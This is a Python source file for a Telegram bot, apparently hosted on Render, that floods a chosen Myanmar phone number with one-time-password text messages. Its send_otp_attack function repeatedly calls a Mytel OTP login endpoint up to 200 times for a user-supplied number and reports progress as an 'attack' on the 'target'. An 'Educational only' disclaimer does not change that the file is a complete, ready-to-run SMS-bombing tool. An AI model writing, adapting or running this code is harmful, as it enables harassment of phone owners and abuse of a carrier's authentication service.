import os
import requests
import logging
from flask import Flask
from threading import Thread
from telegram import Update
from telegram.ext import Application, CommandHandler, ConversationHandler, MessageHandler, filters, ContextTypes

# ---------- CONFIG ----------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("No TELEGRAM_BOT_TOKEN set in environment")

# Conversation states
PHONE, COUNT = range(2)

# ---------- OTP Attack Logic (same as original) ----------
async def send_otp_attack(phone: str, count: int, update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not (phone.startswith("09") and len(phone) == 11):
        await update.message.reply_text("❌ Invalid number. Must be 11 digits starting with 09 (without +95).")
        return False

    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}"
    success = 0
    status_msg = await update.message.reply_text(f"🚀 Attacking {phone}\nAttempts: 0/{count}")

    for i in range(1, count + 1):
        try:
            resp = requests.get(url, timeout=4)
            if resp.status_code == 200:
                success += 1
        except:
            pass
        if i % 5 == 0 or i == count:
            await status_msg.edit_text(f"🚀 Attacking {phone}\nAttempts: {i}/{count}\nSuccessful: {success}")

    await status_msg.edit_text(f"✅ Finished.\nTarget: {phone}\nTotal: {count}\nSuccess: {success}\n⚠️ Educational only.")

# ---------- Telegram Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 OTP Tester Bot\n/attack - Start OTP sequence\n"
        "👨‍💻 @Ace_TM0 | Myanmar Cyber Security"
    )

async def attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📞 Send phone number (11 digits, starts with 09):")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not (phone.startswith("09") and len(phone) == 11 and phone.isdigit()):
        await update.message.reply_text("❌ Invalid. Try again or /cancel")
        return PHONE
    context.user_data["phone"] = phone
    await update.message.reply_text("🔢 How many OTP requests? (1-200):")
    return COUNT

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text)
        if count < 1 or count > 200:
            await update.message.reply_text("Number between 1 and 200.")
            return COUNT
    except ValueError:
        await update.message.reply_text("Enter a number.")
        return COUNT

    phone = context.user_data["phone"]
    await update.message.reply_text(f"⏳ Starting {count} attempts on {phone}...")
    await send_otp_attack(phone, count, update, context)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END

# ---------- Keep-Alive Web Server (for Render) ----------
flask_app = Flask(__name__)

@flask_app.route("/")
def health():
    return "Bot is running"

def run_http_server():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port)

# ---------- Main ----------
def main():
    # Start HTTP server in background (so Render sees open port)
    Thread(target=run_http_server, daemon=True).start()

    # Start Telegram bot with polling
    application = Application.builder().token(TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)

    print("Bot started...")
    application.run_polling()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    main()               
